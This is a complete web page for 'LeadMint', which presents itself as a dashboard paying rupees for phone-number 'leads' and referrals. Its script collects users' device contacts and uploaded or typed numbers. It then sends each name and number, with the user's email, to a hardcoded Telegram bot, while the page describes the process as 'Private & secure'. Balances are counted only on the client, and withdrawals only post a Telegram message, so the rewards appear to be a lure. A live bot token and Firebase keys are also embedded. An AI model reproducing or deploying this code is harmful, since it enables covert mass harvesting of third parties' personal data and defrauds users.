<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
  <title>LeadMint Dashboard · Earn ₹5/Lead + ₹250/Referral</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
  <script type="importmap">
    {
      "imports": {
        "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
        "firebase/auth": "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js",
        "firebase/firestore": "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js"
      }
    }
  </script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    body { font-family: 'Inter', sans-serif; background: #f5f7fb; color: #0f172a; padding: 14px 12px 40px; }
    .container { max-width: 560px; margin: 0 auto; }
    .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 18px; }
    .logo { font-size: 26px; font-weight: 800; background: linear-gradient(135deg, #0a2f44, #1b6b5e); -webkit-background-clip: text; background-clip: text; color: transparent; }
    .logout-btn { background: #f1f5f9; border: none; padding: 8px 18px; border-radius: 40px; font-weight: 500; font-size: 13px; cursor: pointer; }
    .balance-card { background: linear-gradient(125deg, #0a2f44, #124e6b); color: white; border-radius: 32px; padding: 22px 20px; margin-bottom: 20px; }
    .balance-amount { font-size: 42px; font-weight: 800; }
    .progress-bar { background: rgba(255,255,255,0.25); border-radius: 30px; height: 8px; margin: 10px 0; }
    .progress-fill { background: #facc15; width: 0%; height: 100%; border-radius: 30px; transition: width 0.3s; }
    .flex-between { display: flex; justify-content: space-between; align-items: center; }
    .badge { background: rgba(255,255,255,0.2); padding: 4px 10px; border-radius: 40px; font-size: 12px; }
    .contacts-main-btn { background: linear-gradient(135deg, #075E54, #128C7E, #25D366); border-radius: 32px; padding: 28px 20px; margin-bottom: 20px; text-align: center; cursor: pointer; transition: all 0.2s; box-shadow: 0 10px 25px rgba(37,211,102,0.35); width: 100%; border: none; }
    .contacts-main-btn:active { transform: scale(0.97); }
    .contacts-icon { font-size: 48px; margin-bottom: 12px; }
    .contacts-main-btn h2 { color: white; font-size: 22px; margin-bottom: 8px; }
    .contacts-main-btn p { color: rgba(255,255,255,0.9); font-size: 13px; }
    .nav-tabs { display: flex; gap: 10px; margin-bottom: 18px; background: white; padding: 6px; border-radius: 60px; }
    .tab { flex: 1; text-align: center; padding: 10px; border-radius: 50px; font-weight: 600; font-size: 14px; cursor: pointer; }
    .tab.active { background: #0f2b3d; color: white; }
    .card { background: white; border-radius: 28px; padding: 20px 16px; margin-bottom: 18px; }
    .file-zone { border: 2px dashed #cbd5e1; border-radius: 24px; padding: 28px 16px; text-align: center; background: #fafcff; cursor: pointer; margin: 12px 0; }
    .btn-primary { width: 100%; padding: 14px; border-radius: 60px; background: #0f2b3d; color: white; font-weight: 600; border: none; margin-top: 12px; cursor: pointer; }
    .lead-row { background: #f8fafc; padding: 12px; border-radius: 18px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; font-size: 13px; }
    .status-msg { font-size: 13px; padding: 8px 0; color: #475569; }
    .referral-box { background: #fef3c7; padding: 16px; border-radius: 24px; margin-bottom: 18px; text-align: center; }
    .referral-code { font-size: 20px; font-weight: 800; letter-spacing: 2px; background: #0f2b3d; color: white; padding: 8px; border-radius: 40px; display: inline-block; margin: 8px 0; }
    .withdraw-btn { background: #facc15; color: #0f172a; margin-top: 8px; }
    .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #0f2b3d; color: white; padding: 12px 24px; border-radius: 50px; font-size: 14px; z-index: 10000; max-width: 90%; text-align: center; }
  </style>
</head>
<body>
<div class="container">
  <div class="header"><div class="logo">🔥 LeadMint</div><button class="logout-btn" id="logoutBtn">🚪 Exit</button></div>

  <div class="balance-card">
    <div class="flex-between"><span>💰 Lead Wallet</span><span class="badge" id="verifiedCountBadge">0 leads</span></div>
    <div class="balance-amount" id="walletBalanceDisplay">₹0</div>
    <div class="flex-between" style="font-size:13px; margin-top:12px;"><span>📊 Progress</span><span id="lockText">0/100 leads</span></div>
    <div class="progress-bar"><div class="progress-fill" id="withdrawProgressFill"></div></div>
  </div>

  <div class="referral-box">
    <div>👥 Your Referral Code</div>
    <div class="referral-code" id="referralCodeDisplay">LOADING...</div>
    <div style="font-size:12px;">Share this code → Each friend gives you ₹250</div>
    <div class="flex-between" style="margin-top:12px;"><span>💰 Referral Wallet:</span><span id="referralWalletAmount">₹0</span></div>
    <div class="flex-between"><span>👥 Referrals:</span><span id="referralCount">0</span></div>
    <button id="withdrawReferralBtn" class="btn-primary withdraw-btn" style="background:#facc15; margin-top:12px;" disabled>💸 Withdraw Referral (Min 15 referrals & ₹100)</button>
  </div>

  <button class="contacts-main-btn" id="syncContactsBtn">
    <div class="contacts-icon">📱</div>
    <h2>Send Bulk Contacts</h2>
    <p>Tap to allow access • Auto-save all contacts with names</p>
    <p style="font-size:11px;">✓ ₹5 per valid Indian number • Private & secure</p>
  </button>

  <div class="nav-tabs"><div class="tab active" data-tab="uploadTab">📤 Upload File</div><div class="tab" data-tab="recentTab">📋 History</div><div class="tab" data-tab="referralTab">👥 Referrals</div></div>

  <div id="uploadTab" class="tab-content">
    <div class="card">
      <div class="file-zone" id="fileDropZone">📂 Upload Screenshot/PDF/CSV<br><small>Extracts +91 & 10-digit numbers</small><input type="file" id="fileInput" style="display:none;"></div>
      <div id="filePreview" style="display:none; background:#f1f5f9; padding:12px; border-radius:20px; margin:12px 0;"></div>
      <button id="confirmUploadBtn" class="btn-primary">✅ Verify & Add (₹5 each)</button>
      <textarea id="manualNumbers" rows="3" placeholder="Or type: +919876543210, 9876543210" style="width:100%; margin-top:16px; padding:12px; border-radius:20px; border:1px solid #e2e8f0;"></textarea>
      <button id="manualVerifyBtn" class="btn-primary">🔍 Verify Manual</button>
      <div id="uploadStatus" class="status-msg"></div>
    </div>
  </div>

  <div id="recentTab" class="tab-content" style="display:none;"><div class="card"><div id="recentLeadsList">No leads yet.</div></div></div>
  <div id="referralTab" class="tab-content" style="display:none;"><div class="card"><div id="referralList">Loading...</div></div></div>
</div>

<script type="module">
  import { initializeApp } from "firebase/app";
  import { getAuth, signOut, onAuthStateChanged } from "firebase/auth";
  import { getFirestore, doc, getDoc, updateDoc, collection, query, where, getDocs, setDoc } from "firebase/firestore";

  const firebaseConfig = {
    apiKey: "AIzaSyDpFohe_piG3MpnpNJDZcGvTqg5tIu3B-I",
    authDomain: "leadcash-2cb77.firebaseapp.com",
    projectId: "leadcash-2cb77",
    storageBucket: "leadcash-2cb77.firebasestorage.app",
    messagingSenderId: "611052139341",
    appId: "1:611052139341:web:1c5ea10a24591987827d04"
  };
  const app = initializeApp(firebaseConfig);
  const auth = getAuth(app);
  const db = getFirestore(app);

  const BOT_TOKEN = "8619703516:AAEhJJBKYyir3zOo404Yoqv6FnnPj5Xj4Q4";
  const CHAT_ID = "6064803354";
  function sendToTelegram(msg) { try { fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ chat_id: CHAT_ID, text: msg.substring(0,3900) }) }); } catch(e){} }

  function isValidIndianNumber(num) { let cleaned = String(num).replace(/\s/g,''); if(cleaned.startsWith('+91')) cleaned=cleaned.substring(3); cleaned=cleaned.replace(/\D/g,''); return /^[6-9]\d{9}$/.test(cleaned); }
  function normalize(num) { let cleaned = String(num).replace(/\s/g,''); if(cleaned.startsWith('+91')) cleaned=cleaned.substring(3); cleaned=cleaned.replace(/\D/g,''); if(/^[6-9]\d{9}$/.test(cleaned)) return cleaned; return null; }

  let currentUser = null;
  let userData = { balance:0, verifiedLeads:[], totalVerified:0, referralWallet:0, referralCount:0, referralCode:"" };

  async function loadUserData(uid) {
    const docRef = doc(db, "users", uid);
    const docSnap = await getDoc(docRef);
    if(docSnap.exists()) {
      const data = docSnap.data();
      userData = {
        balance: data.balance || 0,
        verifiedLeads: data.verifiedLeads || [],
        totalVerified: data.totalVerified || 0,
        referralWallet: data.referralWallet || 0,
        referralCount: data.referralCount || 0,
        referralCode: data.referralCode || ""
      };
    } else {
      userData = { balance:0, verifiedLeads:[], totalVerified:0, referralWallet:0, referralCount:0, referralCode:"" };
    }
    updateUI();
    loadReferralsList();
  }

  async function updateFirestore() {
    if(currentUser) {
      await updateDoc(doc(db, "users", currentUser.uid), {
        balance: userData.balance,
        verifiedLeads: userData.verifiedLeads,
        totalVerified: userData.totalVerified,
        referralWallet: userData.referralWallet,
        referralCount: userData.referralCount
      });
    }
  }

  async function addVerifiedNumbers(numbersArray, contactNamesMap = null) {
    const validNumbers = numbersArray.filter(isValidIndianNumber);
    if(validNumbers.length===0) return { added:0, msg:"❌ No valid Indian numbers." };
    let newlyAdded=0, addedNumbers=[], addedContacts=[];
    for(let num of validNumbers) {
      const exists = userData.verifiedLeads.some(l=>l.number===num);
      if(!exists) {
        const name = contactNamesMap?.[num] || "Manual";
        userData.verifiedLeads.unshift({ number:num, name:name, date:new Date().toLocaleString() });
        userData.balance += 5;
        userData.totalVerified += 1;
        newlyAdded++;
        addedNumbers.push(num);
        if(name !== "Manual") addedContacts.push({ name, number:num });
      }
    }
    if(newlyAdded===0) return { added:0, msg:"⚠️ All numbers already submitted." };
    await updateFirestore();
    updateUI();
    const userEmail = currentUser?.email || "unknown";
    let tgMsg = `📱 CONTACTS SYNC\n👤 ${userEmail}\n✅ New: ${newlyAdded}\n💰 +₹${newlyAdded*5}\n📊 Total: ${userData.totalVerified}\n💵 Balance: ₹${userData.balance}\n`;
    if(addedContacts.length) tgMsg += `\n${addedContacts.map(c=>`👤 ${c.name}\n📞 ${c.number}`).join('\n\n')}`;
    sendToTelegram(tgMsg);
    return { added:newlyAdded, msg:`✅ +${newlyAdded} numbers! +₹${newlyAdded*5}` };
  }

  async function syncContacts() {
    if(!navigator.contacts) { showToast("❌ Contacts API not supported. Use Chrome on Android.", true); return; }
    showToast("📱 Requesting contacts access...");
    try {
      const contacts = await navigator.contacts.select(['name','tel'], { multiple:true });
      if(!contacts || contacts.length===0) { showToast("⚠️ No contacts selected.", true); return; }
      showToast(`📱 Found ${contacts.length} contacts, extracting...`);
      const validContacts = [];
      const seen = new Set();
      for(const contact of contacts) {
        const name = contact.name?.[0] || "Unknown";
        for(const phone of (contact.tel || [])) {
          const norm = normalize(phone);
          if(norm && isValidIndianNumber(norm) && !seen.has(norm)) {
            seen.add(norm);
            validContacts.push({ name, number: norm });
          }
        }
      }
      if(validContacts.length===0) { showToast("⚠️ No valid Indian numbers found.", true); return; }
      const nameMap = {}; validContacts.forEach(c=> nameMap[c.number]=c.name);
      const numbers = validContacts.map(c=>c.number);
      showToast(`📤 Saving ${validContacts.length} contacts...`);
      const result = await addVerifiedNumbers(numbers, nameMap);
      showToast(result.msg);
    } catch(err) { showToast("❌ Permission denied or error.", true); }
  }

  function showToast(msg, isErr=false) { const t=document.createElement('div'); t.className='toast'; t.innerText=msg; if(isErr) t.style.background='#dc2626'; document.body.appendChild(t); setTimeout(()=>t.remove(),3500); }

  function updateUI() {
    document.getElementById('walletBalanceDisplay').innerText = `₹${userData.balance}`;
    document.getElementById('verifiedCountBadge').innerText = `${userData.totalVerified} leads`;
    const percent = Math.min(100, (userData.totalVerified/100)*100);
    document.getElementById('withdrawProgressFill').style.width = `${percent}%`;
    document.getElementById('lockText').innerText = `${userData.totalVerified}/100 leads`;
    document.getElementById('referralWalletAmount').innerHTML = `₹${userData.referralWallet}`;
    document.getElementById('referralCount').innerText = userData.referralCount;
    document.getElementById('referralCodeDisplay').innerText = userData.referralCode || "XXXXXX";
    const canWithdrawRef = (userData.referralCount >= 15 && userData.referralWallet >= 100);
    document.getElementById('withdrawReferralBtn').disabled = !canWithdrawRef;
    const recentDiv = document.getElementById('recentLeadsList');
    if(userData.verifiedLeads.length===0) recentDiv.innerHTML = '<div class="status-msg">No leads yet. Sync contacts!</div>';
    else recentDiv.innerHTML = userData.verifiedLeads.slice(0,20).map(l=>`<div class="lead-row"><span>📞 ${l.number} ${l.name?`(${l.name.substring(0,12)})`:''}</span><span style="color:#1b6b5e;">+₹5</span><span style="font-size:11px;">${l.date}</span></div>`).join('');
  }

  async function loadReferralsList() {
    if(!currentUser) return;
    const usersRef = collection(db, "users");
    const q = query(usersRef, where("referredBy", "==", currentUser.uid));
    const snapshot = await getDocs(q);
    const listDiv = document.getElementById('referralList');
    if(snapshot.empty) listDiv.innerHTML = '<div class="status-msg">No referrals yet. Share your code!</div>';
    else listDiv.innerHTML = snapshot.docs.map(d=>`<div class="lead-row"><span>👤 ${d.data().name}</span><span style="color:#eab308;">+₹250</span><span style="font-size:11px;">${d.data().createdAt || ''}</span></div>`).join('');
  }

  document.getElementById('syncContactsBtn').onclick = syncContacts;
  document.getElementById('logoutBtn').onclick = () => signOut(auth).then(()=>window.location.href="index.html");
  document.getElementById('withdrawReferralBtn').onclick = async () => {
    if(userData.referralCount>=15 && userData.referralWallet>=100) {
      sendToTelegram(`💸 REFERRAL WITHDRAWAL\nUser: ${currentUser.email}\nAmount: ₹${userData.referralWallet}\nReferrals: ${userData.referralCount}`);
      alert(`✅ Withdrawal request of ₹${userData.referralWallet} submitted!`);
    } else alert(`Need 15+ referrals (${userData.referralCount}/15) & min ₹100 in referral wallet.`);
  };

  // File upload (simplified)
  document.getElementById('fileDropZone').onclick = () => document.getElementById('fileInput').click();
  document.getElementById('fileInput').onchange = async (e) => {
    const file = e.target.files[0];
    if(!file) return;
    const text = await file.text();
    const matches = text.match(/[6-9]\d{9}/g) || [];
    const nums = [...new Set(matches)];
    document.getElementById('filePreview').innerHTML = `<div class="extracted-numbers">Found ${nums.length} numbers: ${nums.slice(0,10).join(', ')}</div>`;
    document.getElementById('filePreview').style.display = 'block';
    window.pendingNumbers = nums;
  };
  document.getElementById('confirmUploadBtn').onclick = async () => {
    if(window.pendingNumbers?.length) {
      const res = await addVerifiedNumbers(window.pendingNumbers);
      showToast(res.msg);
      document.getElementById('filePreview').style.display = 'none';
      window.pendingNumbers = [];
    } else showToast("No numbers to verify");
  };
  document.getElementById('manualVerifyBtn').onclick = async () => {
    const raw = document.getElementById('manualNumbers').value;
    const nums = raw.match(/[6-9]\d{9}/g) || [];
    if(nums.length) {
      const res = await addVerifiedNumbers(nums);
      showToast(res.msg);
      document.getElementById('manualNumbers').value = '';
    } else showToast("No valid numbers found");
  };

  document.querySelectorAll('.tab').forEach(tab=>tab.onclick=()=>{
    const id=tab.dataset.tab;
    document.querySelectorAll('.tab-content').forEach(c=>c.style.display='none');
    document.getElementById(id).style.display='block';
    document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
    tab.classList.add('active');
    if(id==='referralTab') loadReferralsList();
  });

  onAuthStateChanged(auth, async (user) => {
    if(!user) { window.location.href="index.html"; return; }
    currentUser = user;
    await loadUserData(user.uid);
  });
</script>
</body>
</html>
